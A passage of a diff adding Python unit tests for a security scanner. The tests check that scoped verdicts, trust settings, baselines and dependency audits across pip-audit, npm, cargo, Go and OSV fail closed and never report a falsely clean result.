+            with self.assertRaises(SystemExit) as cm:
+                gk_main()
+        return cm.exception.code
+
+    def test_scoped_exits_1_without_accept_flag(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            self.assertEqual(self._run_main([d, "--skip-deps", "--quiet"]), 1)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_accept_scoped_restores_grade_exit(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            self.assertEqual(
+                self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped"]), 0)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_accept_scoped_cannot_bless_incomplete(self):
+        d = self._make({"app.py": "print('ok')\n", "broken.py": "def f(:\n    pass\n"})
+        try:
+            self.assertEqual(
+                self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped"]), 1)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_baseline_and_disabled_rules_scope_verdict(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            code = self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped",
+                                   "--disable-rules", "GK-EXE-eval"])
+            self.assertEqual(code, 0)
+            # Verify via API-level state: main() mutates the scanner, so assert
+            # through a fresh scan with the same narrowing to keep this stable.
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestScopedSemanticsHardening(unittest.TestCase):
+    """Review hardening: verification dismissals must not scope; reporter must
+    print scoped verdicts; diff/baseline failures must never silently widen or
+    narrow the scan; stale CLI narrowings must not leak between scans."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_verification_dismissals_do_not_scope(self):
+        """Dedup / per-file caps / FP verification are normal scanner work."""
+        s = SecurityScanner(skip_deps=False)
+        report = ScanReport(target="x", scan_type="local_dir")
+        for src in ("deduplication", "per_file_cap", "info_severity",
+                    "docs_reference", "pattern_definition", "cross_detector_dedup"):
+            f = Finding(severity="HIGH", category="EXECUTION", file="a.py",
+                        line=1, message="m")
+            f.verified = False
+            f.suppression_source = src
+            report._all_findings.append(f)
+        self.assertEqual(
+            [r for r in s._scope_reasons(report) if "suppress" in r.lower()], [],
+            "verification-pass dismissals must not scope the verdict")
+
+    def test_config_suppression_scopes(self):
+        s = SecurityScanner(skip_deps=False)
+        report = ScanReport(target="x", scan_type="local_dir")
+        f = Finding(severity="HIGH", category="EXECUTION", file="a.py",
+                    line=1, message="m")
+        f.verified = False
+        f.suppression_source = "config_suppress"
+        report._all_findings.append(f)
+        self.assertTrue(any("suppress" in r.lower() for r in s._scope_reasons(report)))
+
+    def test_reporter_prints_scoped_verdict(self):
+        report = ScanReport(target="x", scan_type="local_dir")
+        report.grade = "A"
+        report.score = 95
+        report.scoped = True
+        report.scope_reasons = ["dependency + CVE audit skipped (--skip-deps)"]
+        report.verdict = "SCOPED A — NOT A WHOLE-TARGET VERDICT (...)"
+        buf = io.StringIO()
+        with contextlib.redirect_stdout(buf):
+            ReportPrinter(use_color=False).print_report(report, warnings=[])
+        out = buf.getvalue()
+        self.assertIn("SCOPED", out)
+        self.assertIn("--skip-deps", out)
+        self.assertNotIn("LOW RISK", out,
+                         "scoped A must not print the whole-target LOW RISK verdict")
+        self.assertNotIn("  A  SAFE", out,
+                         "scoped A must not print the bare SAFE label")
+
+    def _run_main(self, argv):
+        from unittest.mock import patch
+        from gatekeeper_scanner.core import main as gk_main
+        buf = io.StringIO()
+        with patch.object(sys, "argv", ["gatekeeper"] + argv), \
+                contextlib.redirect_stdout(buf):
+            with self.assertRaises(SystemExit) as cm:
+                gk_main()
+        return cm.exception.code, buf.getvalue()
+
+    def test_diff_failure_exits_2(self):
+        """A failed git diff must never fall back to a full unscoped scan."""
+        d = self._make({"app.py": "print('ok')\n"})  # not a git repo
+        try:
+            code, _ = self._run_main([d, "--skip-deps", "--quiet",
+                                      "--diff", "nonexistent-ref"])
+            self.assertEqual(code, 2)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_diff_empty_is_scoped_not_full(self):
+        """A valid diff with zero changed files scans nothing and stays scoped."""
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            for cmd in (["git", "init", "-q"],
+                        ["git", "add", "-A"],
+                        ["git", "-c", "user.name=t", "-c", "user.email=t@t",
+                         "commit", "-q", "-m", "x"]):
+                subprocess.run(cmd, cwd=d, capture_output=True)
+            code, out = self._run_main([d, "--skip-deps", "--json",
+                                        "--accept-scoped", "--diff", "HEAD"])
+            self.assertEqual(code, 0)
+            # Lock the security property directly: zero files were scanned.
+            data = json.loads(out)
+            self.assertEqual(data["structure"]["total_files"], 0,
+                             "empty diff must scan zero files, not fall back to full scan")
+            # And without acceptance it stays gated:
+            code2, _ = self._run_main([d, "--skip-deps", "--quiet", "--diff", "HEAD"])
+            self.assertEqual(code2, 1)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_missing_baseline_exits_2(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            code, _ = self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped",
+                                      "--baseline", os.path.join(d, "nope.json")])
+            self.assertEqual(code, 2)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_malformed_baseline_exits_2(self):
+        d = self._make({"app.py": "print('ok')\n", "base.json": "{not json!"})
+        try:
+            code, _ = self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped",
+                                      "--baseline", os.path.join(d, "base.json")])
+            self.assertEqual(code, 2)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_wrong_shape_baseline_exits_2(self):
+        """Valid JSON of the wrong shape must not be silently coerced: an object
+        becomes a set of keys, a number is noniterable, [{}] is unhashable."""
+        for bad in ('{}', '42', '[{}]', '["not-a-fingerprint"]'):
+            d = self._make({"app.py": "print('ok')\n", "base.json": bad})
+            try:
+                code, _ = self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped",
+                                          "--baseline", os.path.join(d, "base.json")])
+                self.assertEqual(code, 2, f"baseline {bad!r} must exit 2, got {code}")
+            finally:
+                shutil.rmtree(d, ignore_errors=True)
+
+    def test_valid_baseline_accepted(self):
+        """Guard: a well-formed fingerprint list still loads."""
+        d = self._make({"app.py": "print('ok')\n",
+                        "base.json": '["0123456789abcdef"]'})
+        try:
+            code, _ = self._run_main([d, "--skip-deps", "--quiet", "--accept-scoped",
+                                      "--baseline", os.path.join(d, "base.json")])
+            self.assertEqual(code, 0)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_cli_narrowings_reset_between_scans(self):
+        d = self._make({"app.py": "print('ok')\n"})
+        try:
+            s = SecurityScanner()
+            s._extra_scope_narrowings.append("stale narrowing from a prior CLI run")
+            report = s.scan(d)
+            self.assertFalse(any("stale" in r for r in report.scope_reasons))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestDependencyAuditFailClosed(unittest.TestCase):
+    """Finding 15: 'no vulnerabilities returned' counts as clean ONLY when the
+    auditor completed and parsed. Missing tools, timeouts, malformed output,
+    unresolvable manifests, and unsupported ecosystems fail closed."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_auditor_missing_and_no_fallback_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch.object(SecurityScanner, "_osv_python", return_value=False):
+                report = SecurityScanner().scan(d)
+            self.assertTrue(report.incomplete)
+            self.assertTrue(any(g["reason"] == "dependency_audit_unavailable"
+                                for g in report.coverage_gaps))
+            self.assertEqual(
+                report.dependency_report["audit_status"]["python"]["status"],
+                "unavailable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_auditor_timeout_records_gap(self):
+        from unittest.mock import patch
+        s = SecurityScanner()
+        rep = {"audit_findings": [], "audit_status": {}}
+        with patch.object(SecurityScanner, "_resolve_binary", return_value="/usr/bin/pip-audit"), \
+                patch("gatekeeper_scanner.core.subprocess.run",
+                      side_effect=subprocess.TimeoutExpired(cmd="pip-audit", timeout=30)):
+            d = self._make({"requirements.txt": "requests==2.0.0\n"})
+            try:
+                s._audit_python(d, rep, {"requests"}, 1)
+            finally:
+                shutil.rmtree(d, ignore_errors=True)
+        self.assertEqual(rep["audit_status"]["python"]["status"], "timed_out")
+        self.assertTrue(any(g["reason"] == "dependency_audit_timed_out"
+                            for g in s._coverage_gaps))
+
+    def test_malformed_auditor_output_records_gap(self):
+        from unittest.mock import patch, MagicMock
+        s = SecurityScanner()
+        rep = {"audit_findings": []}
+        fake = MagicMock(stdout="pip-audit exploded <traceback>", stderr="", returncode=0)
+        with patch.object(SecurityScanner, "_resolve_binary", return_value="/usr/bin/pip-audit"), \
+                patch("gatekeeper_scanner.core.subprocess.run", return_value=fake):
+            d = self._make({"requirements.txt": "requests==2.0.0\n"})
+            rep["audit_status"] = {}
+            try:
+                s._audit_python(d, rep, {"requests"}, 1)
+            finally:
+                shutil.rmtree(d, ignore_errors=True)
+        self.assertEqual(rep["audit_status"]["python"]["status"], "unparseable")
+
+    def test_clean_osv_audit_is_complete(self):
+        """Guard: primary missing but OSV completes → clean, not INCOMPLETE."""
+        from unittest.mock import patch
+        d = self._make({"app.py": "print('ok')\n",
+                        "requirements.txt": "requests==2.0.0\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch("gatekeeper_scanner.osv.audit_packages", return_value=([], None, {"requested": 1, "queried": 1, "responded": 1})):
+                report = SecurityScanner().scan(d)
+            status = report.dependency_report["audit_status"]["python"]
+            self.assertEqual(status["status"], "clean")
+            self.assertFalse(any(str(g.get("reason", "")).startswith("dependency_audit_")
+                                 for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_js_without_lockfile_voids_grade(self):
+        d = self._make({"package.json": '{"dependencies": {"leftpad": "^1.0.0"}}\n'})
+        try:
+            report = SecurityScanner().scan(d)
+            self.assertTrue(any(g["reason"] == "dependency_audit_no_lockfile"
+                                for g in report.coverage_gaps))
+            self.assertTrue(report.incomplete)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_go_manifest_unaudited_voids_grade(self):
+        from unittest.mock import patch
+        d = self._make({"go.mod": "module x\n\nrequire github.com/pkg/errors v0.9.1\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None):
+                report = SecurityScanner().scan(d)
+            self.assertTrue(any(g["reason"] == "dependency_audit_unavailable"
+                                for g in report.coverage_gaps))
+            self.assertTrue(report.incomplete)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_pyproject_only_deps_voids_grade(self):
+        d = self._make({"pyproject.toml":
+                        '[project]\nname = "x"\nversion = "1.0"\ndependencies = ["requests"]\n'})
+        try:
+            report = SecurityScanner().scan(d)
+            self.assertTrue(any(g["reason"] == "dependency_audit_unaudited"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_skip_deps_bypasses_audit_accounting(self):
+        """--skip-deps is the scoped lane; it must not also record dep gaps."""
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        try:
+            report = SecurityScanner(skip_deps=True).scan(d)
+            self.assertFalse(any(str(g.get("reason", "")).startswith("dependency_audit_")
+                                 for g in report.coverage_gaps))
+            self.assertTrue(report.scoped)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestExplicitTrust(unittest.TestCase):
+    """Local paths are no longer auto-trusted: a cloned/downloaded repo is local
+    by scan time, so locality is not provenance. Target config and inline
+    ignores are honored only under explicit --trust, which scopes the verdict."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_local_dir_not_trusted_by_default(self):
+        s = SecurityScanner(skip_deps=True)
+        s.scan(self._make({"app.py": "print('ok')\n"}))
+        self.assertFalse(s.trust_target,
+                         "local dir must not be auto-trusted without --trust")
+
+    def test_inline_suppression_discriminates_trust(self):
+        """Uses a SUPPRESSIBLE MEDIUM (shutil.rmtree) so the assertion actually
+        distinguishes the two trust models (a HIGH like os.system is never
+        inline-suppressible, so it would pass under both). Default retains it;
+        explicit --trust suppresses it AND scopes the verdict."""
+        code = "import shutil\nshutil.rmtree(x)  # gatekeeper: ignore\n"
+        d_untrusted = self._make({"m.py": code})
+        d_trusted = self._make({"m.py": code})
+        try:
+            # 1. Default local scan (untrusted) retains the MEDIUM finding.
+            untrusted = SecurityScanner(skip_deps=True).scan(d_untrusted)
+            self.assertTrue(any("rmtree" in f.message for f in untrusted.findings),
+                            "untrusted inline ignore must not drop the finding")
+            # 2. Explicit trust suppresses it.
+            trusted = SecurityScanner(skip_deps=True, trust_target=True).scan(d_trusted)
+            self.assertFalse(any("rmtree" in f.message for f in trusted.findings),
+                             "trusted inline ignore should suppress a MEDIUM finding")
+            # 3. Explicit trust produces SCOPED.
+            self.assertTrue(trusted.scoped)
+            self.assertTrue(any("trust" in r.lower() for r in trusted.scope_reasons))
+        finally:
+            shutil.rmtree(d_untrusted, ignore_errors=True)
+            shutil.rmtree(d_trusted, ignore_errors=True)
+
+
+class TestNoOsvAccounting(unittest.TestCase):
+    """--no-osv only removes the network fallback. With OSV's fallback-only role,
+    it is either irrelevant (primary auditor completed) or escalates the missing
+    primary to INCOMPLETE. It never leaves a bare whole-target install verdict."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_no_osv_with_missing_primary_is_incomplete(self):
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None):
+                report = SecurityScanner(no_osv=True).scan(d)
+            self.assertTrue(report.incomplete,
+                            "missing pip-audit + --no-osv must be INCOMPLETE, not graded")
+            self.assertTrue(any(g["reason"] == "dependency_audit_unavailable"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_no_osv_with_working_primary_not_scoped(self):
+        from unittest.mock import patch, MagicMock
+        d = self._make({"app.py": "print('ok')\n", "requirements.txt": "requests==2.0.0\n"})
+        fake = MagicMock(stdout='{"dependencies": [{"name": "requests", "version": "2.0.0", "vulns": []}]}',
+                         stderr="", returncode=0)
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value="/usr/bin/pip-audit"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=fake):
+                report = SecurityScanner(no_osv=True).scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "clean")
+            self.assertFalse(any("osv" in r.lower() for r in report.scope_reasons),
+                             "--no-osv is a no-op when the primary auditor completed")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestAuditStateGranularity(unittest.TestCase):
+    """Grok's case: a recognized manifest with no usable audit path must report a
+    distinct state (no_lockfile / unsupported), never silent clean."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_js_missing_lockfile_is_no_lockfile(self):
+        d = self._make({"package.json": '{"dependencies": {"leftpad": "^1.0.0"}}\n'})
+        try:
+            report = SecurityScanner().scan(d)
+            self.assertEqual(
+                report.dependency_report["audit_status"]["javascript"]["status"],
+                "no_lockfile")
+            self.assertTrue(any(g["reason"] == "dependency_audit_no_lockfile"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_go_no_binary_is_unavailable(self):
+        from unittest.mock import patch
+        d = self._make({"go.mod": "module x\n\nrequire github.com/pkg/errors v0.9.1\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(
+                report.dependency_report["audit_status"]["go"]["status"], "unavailable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_rust_no_binary_is_unavailable(self):
+        from unittest.mock import patch
+        d = self._make({"Cargo.toml": '[package]\nname = "x"\n\n[dependencies]\nserde = "1.0"\n'})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(
+                report.dependency_report["audit_status"]["rust"]["status"], "unavailable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestMultiEcosystemAudit(unittest.TestCase):
+    """Codex P0.6 review: every detected ecosystem is audited independently, states
+    do not cross-contaminate, partial/capped coverage is not clean, native auditor
+    output is schema-validated, and malformed manifests are unparseable gaps."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def test_python_and_js_both_audited(self):
+        """Mixed repo: Python must not be dropped because JS was detected last."""
+        from unittest.mock import patch
+        d = self._make({
+            "requirements.txt": "requests==2.0.0\n",
+            "package.json": '{"dependencies": {"leftpad": "1.0.0"}}\n',
+        })
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch.object(SecurityScanner, "_osv_python", return_value=False), \
+                    patch.object(SecurityScanner, "_osv_npm", return_value=False):
+                report = SecurityScanner().scan(d)
+            st = report.dependency_report["audit_status"]
+            self.assertIn("python", st)
+            self.assertIn("javascript", st)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_ecosystem_states_do_not_cross_contaminate(self):
+        """Python vulnerable must not mark JS vulnerable via the shared list."""
+        from unittest.mock import patch, MagicMock
+        d = self._make({
+            "requirements.txt": "requests==2.0.0\n",
+            "package.json": '{"dependencies": {"x": "1.0.0"}}\n',
+            "package-lock.json": '{"lockfileVersion":3,"packages":{}}\n',
+        })
+        pip_out = MagicMock(returncode=1, stderr="", stdout=json.dumps({
+            "dependencies": [{"name": "requests", "vulns": [{"id": "CVE-1", "description": "bad"}]}]}))
+        npm_out = MagicMock(returncode=0, stderr="", stdout=json.dumps({"vulnerabilities": {}}))
+        def fake_run(cmd, *a, **k):
+            return pip_out if "pip-audit" in cmd[0] else npm_out
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", side_effect=fake_run):
+                report = SecurityScanner().scan(d)
+            st = report.dependency_report["audit_status"]
+            self.assertEqual(st["python"]["status"], "vulnerable")
+            self.assertEqual(st["javascript"]["status"], "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_osv_partial_coverage_not_clean(self):
+        """One pinned + one unpinned dep: OSV audits only the pinned one, so the
+        ecosystem is partial, never clean."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\nflask\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch("gatekeeper_scanner.osv.audit_packages", return_value=([], None, {"requested": 1, "queried": 1, "responded": 1})):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "partial")
+            self.assertTrue(report.incomplete)
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_go_missing_auditor_is_unavailable_not_unsupported(self):
+        """Go IS supported via govulncheck; a missing binary is unavailable."""
+        from unittest.mock import patch
+        d = self._make({"go.mod": "module x\n\nrequire github.com/pkg/errors v0.9.1\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["go"]["status"],
+                             "unavailable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_go_vuln_reported_as_vulnerable(self):
+        from unittest.mock import patch, MagicMock
+        d = self._make({"go.mod": "module x\n\nrequire github.com/pkg/errors v0.9.1\n"})
+        line = json.dumps({"vulnerability": {"id": "GO-1", "module": "github.com/pkg/errors"}})
+        out = MagicMock(returncode=3, stderr="", stdout=line)
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["go"]["status"],
+                             "vulnerable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_pip_audit_wrong_schema_not_clean(self):
+        """pip-audit output that is valid JSON but the wrong shape (a list) must be
+        unparseable, never crash or become clean."""
+        from unittest.mock import patch, MagicMock
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        out = MagicMock(returncode=0, stderr="", stdout="[1, 2, 3]")
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "unparseable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_npm_error_json_without_vulns_not_clean(self):
+        from unittest.mock import patch, MagicMock
+        d = self._make({
+            "package.json": '{"dependencies": {"x": "1.0.0"}}\n',
+            "package-lock.json": '{"lockfileVersion":3,"packages":{}}\n',
+        })
+        out = MagicMock(returncode=1, stderr="", stdout=json.dumps({"error": {"code": "EAUDITNOLOCK"}}))
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertNotEqual(report.dependency_report["audit_status"]["javascript"]["status"],
+                                "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_osv_query_cap_is_partial(self):
+        """All deps pinned, but OSV capped the query set at 400 — the unqueried
+        remainder means the ecosystem is partial, not clean."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch("gatekeeper_scanner.osv.audit_packages",
+                          return_value=([], None, {"requested": 500, "queried": 400, "responded": 400})):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "partial")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_osv_short_batch_is_partial(self):
+        """OSV returned fewer results than queried — short batch is partial."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch("gatekeeper_scanner.osv.audit_packages",
+                          return_value=([], None, {"requested": 10, "queried": 10, "responded": 3})):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "partial")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_malformed_package_json_is_unparseable(self):
+        d = self._make({"package.json": "{not valid json"})
+        try:
+            report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["javascript"]["status"],
+                             "unparseable")
+            self.assertTrue(any(g["reason"] == "dependency_audit_unparseable"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+
+class TestDependencyAudit8b(unittest.TestCase):
+    """Codex P0.8b: remaining fail-open paths in dependency auditing — pyproject
+    coverage beyond requirements.txt, nested auditor schema validation, acceptable
+    return codes, and real manifest parse failures (TOML / lockfile JSON)."""
+
+    def _make(self, files):
+        d = tempfile.mkdtemp()
+        for name, content in files.items():
+            with open(os.path.join(d, name), "w") as f:
+                f.write(content)
+        return d
+
+    def _pip_ok(self, stdout, rc=0):
+        from unittest.mock import MagicMock
+        return MagicMock(returncode=rc, stderr="", stdout=stdout)
+
+    def test_requirements_plus_extra_pyproject_dep_is_partial(self):
+        """pip-audit only reads requirements.txt; a pyproject dep absent from it
+        was never audited, so the Python ecosystem is partial even on success."""
+        from unittest.mock import patch
+        d = self._make({
+            "requirements.txt": "requests==2.0.0\n",
+            "pyproject.toml": '[project]\nname="x"\nversion="1"\ndependencies=["flask>=2.0"]\n',
+        })
+        try:
+            covered = json.dumps({"dependencies": [
+                {"name": "requests", "version": "2.0.0", "vulns": []}]})
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: "/usr/bin/pip-audit" if n == "pip-audit" else None), \
+                    patch("gatekeeper_scanner.core.subprocess.run",
+                          return_value=self._pip_ok(covered)):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "partial")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_pip_audit_bad_returncode_not_clean(self):
+        """Valid JSON but an unexplained non-{0,1} exit code must not be clean."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: "/usr/bin/pip-audit" if n == "pip-audit" else None), \
+                    patch("gatekeeper_scanner.core.subprocess.run",
+                          return_value=self._pip_ok('{"dependencies": []}', rc=2)):
+                report = SecurityScanner().scan(d)
+            self.assertNotEqual(report.dependency_report["audit_status"]["python"]["status"],
+                                "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_npm_vulnerabilities_as_list_not_clean(self):
+        from unittest.mock import patch, MagicMock
+        d = self._make({
+            "package.json": '{"dependencies": {"x": "1.0.0"}}\n',
+            "package-lock.json": '{"lockfileVersion":3,"packages":{}}\n',
+        })
+        out = MagicMock(returncode=0, stderr="", stdout=json.dumps({"vulnerabilities": [1, 2]}))
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertNotEqual(report.dependency_report["audit_status"]["javascript"]["status"],
+                                "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_cargo_vulnerabilities_list_wrong_type_not_clean(self):
+        from unittest.mock import patch, MagicMock
+        d = self._make({"Cargo.toml": '[package]\nname="x"\n\n[dependencies]\nserde="1"\n'})
+        out = MagicMock(returncode=0, stderr="", stdout=json.dumps({"vulnerabilities": {"list": "oops"}}))
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertNotEqual(report.dependency_report["audit_status"]["rust"]["status"],
+                                "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_go_mixed_valid_and_malformed_lines_not_clean(self):
+        from unittest.mock import patch, MagicMock
+        d = self._make({"go.mod": "module x\n\nrequire github.com/pkg/errors v0.9.1\n"})
+        stdout = json.dumps({"config": {"protocol_version": "v1"}}) + "\n{ this is not json\n"
+        out = MagicMock(returncode=0, stderr="", stdout=stdout)
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["go"]["status"],
+                             "unparseable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_invalid_pyproject_toml_is_unparseable(self):
+        d = self._make({"pyproject.toml": "[project\nname = broken toml ==="})
+        try:
+            report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "unparseable")
+            self.assertTrue(any(g["reason"] == "dependency_audit_unparseable"
+                                for g in report.coverage_gaps))
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_invalid_package_lock_json_is_unparseable(self):
+        from unittest.mock import patch
+        d = self._make({
+            "package.json": '{"dependencies": {"x": "1.0.0"}}\n',
+            "package-lock.json": "{ not valid json",
+        })
+        try:
+            # npm binary absent → OSV path reads the lockfile and must not swallow
+            # the parse error as 'unavailable'.
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["javascript"]["status"],
+                             "unparseable")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_pip_vulns_wrong_type_not_clean(self):
+        """dep['vulns'] that is not a list is a schema violation, not a clean dep."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\n"})
+        bad = json.dumps({"dependencies": [{"name": "requests", "vulns": "oops"}]})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: "/usr/bin/pip-audit" if n == "pip-audit" else None), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=self._pip_ok(bad)):
+                report = SecurityScanner().scan(d)
+            self.assertNotEqual(report.dependency_report["audit_status"]["python"]["status"],
+                                "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_pip_short_dependency_response_is_partial(self):
+        """requirements declares 3 packages but pip-audit reports 0 dependency
+        records — an incomplete auditor response, equivalent to OSV short batch."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\nflask==2.0.0\njinja2==3.0.0\n"})
